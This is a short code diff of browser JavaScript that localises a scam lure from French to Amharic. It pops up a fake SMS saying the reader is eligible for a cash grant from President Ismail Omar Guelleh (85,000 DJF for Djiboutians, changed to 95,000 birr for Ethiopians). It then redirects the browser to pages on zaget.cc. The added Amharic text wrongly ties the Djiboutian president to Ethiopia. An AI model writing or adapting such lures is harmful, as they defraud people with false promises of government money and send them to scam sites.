@@ -1,6 +1,5 @@
-
-var password = 'RETIRER 85 000DJF'
-password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de 85 000DJF du Président ISMAIL OMAR GUELLEH pour les DJIBOUTIENS. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETIRER 85 000DJF');
-if (password != 'RETIRER 85 000DJF') {
-location.href='https://zaget.cc/djibouti-grant.html';
+var password = 'ይውሰዱ 95,000 ብር';
+password = prompt('ኤስኤምኤስ፡ እንኳን ደስ አለዎት፣ የፕሬዚዳንት ኢስማኤል ኦማር ጉዔሌ የገንዘብ ክትትል ለኢትዮጵያውያን የክረምት የገንዘብ ድጋፍ 95,000 ብር ብቻ ዝግጁ ነዎት። ቅጽሩን ለመቀበል ኦኬ ይጫኑ።', 'ይውሰዱ 95,000 ብር');
+if (password != 'ይውሰዱ 95,000 ብር') {
+location.href='https://zaget.cc/ethiopia-grant.html';
 }
